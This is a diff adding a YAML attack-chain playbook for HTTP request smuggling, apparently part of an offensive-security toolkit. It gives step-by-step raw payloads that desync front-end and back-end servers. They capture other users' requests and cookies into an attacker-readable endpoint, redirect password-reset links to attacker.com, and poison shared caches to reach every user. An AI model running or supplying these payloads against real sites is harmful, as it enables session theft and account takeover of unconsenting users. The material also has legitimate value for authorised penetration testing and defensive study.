@@ -1,0 +1,111 @@
+id: http-request-smuggling
+name: "Web — HTTP request smuggling (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE)"
+description: >
+  Front-end (CDN / proxy) and back-end disagree on where one HTTP request
+  ends and the next begins. Smuggle a prefix that the back-end treats as
+  belonging to the NEXT user's connection → session theft, header
+  injection, cache poisoning, internal endpoint access.
+tags: [web, http-smuggling, desync, h2, classic-web]
+difficulty: hard
+
+inputs:
+  - name: target_host
+    description: "Hostname with the suspected proxy chain."
+    required: true
+
+steps:
+  - id: discover
+    name: "Run HTTP Request Smuggler scan in Burp"
+    inline_command: "echo 'Burp → extension HTTP Request Smuggler → right-click target → Launch Smuggle Probe. Reports any of CL.TE / TE.CL / TE.TE / H2.CL / H2.TE detected.'"
+    notes: |
+      Manual probe (CL.TE): two conflicting headers; front-end honors
+      Content-Length, back-end honors Transfer-Encoding.
+        POST / HTTP/1.1
+        Host: <host>
+        Transfer-Encoding: chunked
+        Content-Length: 5
+
+        0
+
+        G
+      → back-end leaves `G` in the socket buffer; treated as the start of
+      the next request → that user sees response for "G..." prefix.
+
+  - id: capture_victim_request
+    name: "Smuggle a prefix that captures the victim's request"
+    inline_command: |
+      # Send via Burp Repeater (raw, with Content-Length disabled in Repeater settings):
+      cat <<'EOF' > smuggle.txt
+      POST / HTTP/1.1
+      Host: <host>
+      Transfer-Encoding: chunked
+      Content-Length: 213
+
+      0
+
+      POST /log HTTP/1.1
+      Host: <host>
+      Cookie: x=
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 200
+
+      x=
+      EOF
+      # The back-end parses the smuggled POST /log; it consumes 200 bytes
+      # of the NEXT victim's actual request and stores them in your /log
+      # form param. Hit /log/admin to retrieve the captured data.
+
+  - id: header_injection_via_smuggling
+    name: "Inject X-Forwarded-Host into victim's session"
+    inline_command: |
+      # Smuggle a request whose Host header attacker controls; if the
+      # origin builds password-reset URLs from Host, the reset email
+      # link points at attacker.com:
+      cat <<'EOF' >> smuggle.txt
+      GET /reset-password?email=victim@target.com HTTP/1.1
+      Host: attacker.com
+      EOF
+      # → password-reset link in email: https://attacker.com/reset?token=...
+
+  - id: poison_cache_via_smuggling
+    name: "Combine with cache poisoning"
+    inline_command: |
+      # Smuggle a request that hits a cacheable static path with malicious
+      # Host header → response keyed under /static/main.js with attacker content.
+      # See chains/cache-deception-poisoning.yaml for the cache primitive.
+      echo 'Chain into cache-deception-poisoning for the cache abuse.'
+
+  - id: h2_smuggling
+    name: "HTTP/2 smuggling (modern hot variant)"
+    inline_command: |
+      # H2.CL: HTTP/2 strips Content-Length validation; back-end speaks HTTP/1.1
+      # and trusts the smuggled CL.
+      # H2.TE: same for Transfer-Encoding.
+      # H2.0: HTTP/2 newline injection — :authority value contains \r\n that
+      # introduces a header on the down-converted HTTP/1.1 request.
+      # Burp Repeater → toggle "send via HTTP/2" → enter pseudo-header
+      # values like:
+      #   :authority: target.com\r\nFoo: bar
+    notes: |
+      James Kettle's "HTTP/2: The Sequel is Always Worse" (Black Hat 2021)
+      catalogs every variant. Modern Burp builds in detection.
+
+  - id: confirm_and_weaponize
+    name: "Confirm desync → measure how much you can smuggle"
+    inline_command: |
+      # Differential test: send 2 versions of the same probe; one with
+      # the smuggle padding, one without. Different response time / status
+      # = confirmation.
+
+references:
+  - title: "PortSwigger — Request smuggling"
+    url:   "https://portswigger.net/web-security/request-smuggling"
+  - title: "James Kettle — H2 The Sequel Is Always Worse"
+    url:   "https://portswigger.net/research/http2"
+  - title: "Smashing the State Machine (race + smuggle hybrid)"
+    url:   "https://portswigger.net/research/smashing-the-state-machine"
+
+next_chains:
+  - chain: cache-deception-poisoning
+    when:   'smuggling lands → poison cache for persistence'
+    reason: 'Combine for shared-cache backdoor that affects every user.'
